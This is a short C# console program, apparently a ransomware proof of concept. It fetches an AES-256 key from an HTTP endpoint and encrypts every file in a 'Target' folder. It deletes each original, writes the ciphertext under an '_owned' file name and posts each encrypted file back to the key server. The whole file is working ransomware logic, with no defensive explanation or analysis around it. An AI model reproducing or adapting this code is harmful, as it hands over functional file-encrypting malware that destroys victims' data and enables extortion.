// See https://aka.ms/new-console-template for more information\
using CasDotnetSdk.Symmetric;
using Shared;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;

try
{
    string receiverHost = "https://localhost:7155/api/Encryption";
    using HttpClient hc = new HttpClient();
    HttpResponseMessage httpGetResult = await hc.GetAsync(receiverHost + "/AesKey");
    string content = await httpGetResult.Content.ReadAsStringAsync();
    JsonSerializerOptions options = new JsonSerializerOptions();
    options.PropertyNameCaseInsensitive = true;
    AesKeyResult aesKeyResult = JsonSerializer.Deserialize<AesKeyResult>(content, options);

    string currentDir = Directory.GetCurrentDirectory();
    string targetDir = currentDir + "/" + "Target";
    string[] currentFiles = Directory.GetFiles(targetDir);
    AESWrapper aesWrapper = new AESWrapper();
    for (int i = 0; i < currentFiles.Length; i++)
    {
        string currentFile = currentFiles[i];
        string[] fileName = Path.GetFileName(currentFile).Split(".");
        string newFileName = fileName[0] + "_owned." + fileName[1];
        byte[] fileBytes = File.ReadAllBytes(currentFile);
        byte[] encrypted = aesWrapper.Aes256EncryptBytes(aesKeyResult.Nonce, aesKeyResult.Key, fileBytes);
        File.Delete(currentFile);
        File.WriteAllBytes(targetDir + "/" + newFileName, encrypted);
        AesEncryptedFile encryptedFileBody = new AesEncryptedFile()
        {
            EncryptedBytes = encrypted,
            Id = aesKeyResult.Id,
            FileName = newFileName,
        };
        string postBody = JsonSerializer.Serialize(encryptedFileBody, options);
        var stringContent = new StringContent(postBody, Encoding.UTF8, "application/json");
        HttpResponseMessage response = await hc.PostAsync(receiverHost + "/AesEncryptedFile", stringContent);
        if (response.IsSuccessStatusCode)
        {
            Console.Write("Success");
        }
    }

    while (Console.ReadLine() != "q")
    {
    };

} catch(Exception ex)
{
    throw ex;
}